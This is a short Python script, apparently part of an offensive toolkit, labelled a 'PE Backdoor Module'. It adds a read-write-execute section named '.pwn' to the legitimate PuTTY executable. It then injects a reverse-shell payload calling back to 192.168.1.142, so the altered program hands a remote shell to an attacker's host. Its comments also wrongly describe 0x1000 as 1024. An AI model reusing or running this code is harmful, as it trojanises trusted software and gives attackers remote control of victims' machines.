from _init_ import *

print("Running PE Backdoor Module...\n")

print("Adding new section...")

section_injection.add_section("./assets/bin/putty.exe",
                              ".pwn",
                              0x1000,        # Page Size 1024
                              0x1000,        # Section Size 1024
                              0xE0000000)    # permissions READ WRITE EXECUTE

print("Injection payload...")
payload_injection.insert_payload(
    "./assets/bin/putty_injection.exe", 'rev', lhost='192.168.1.142')
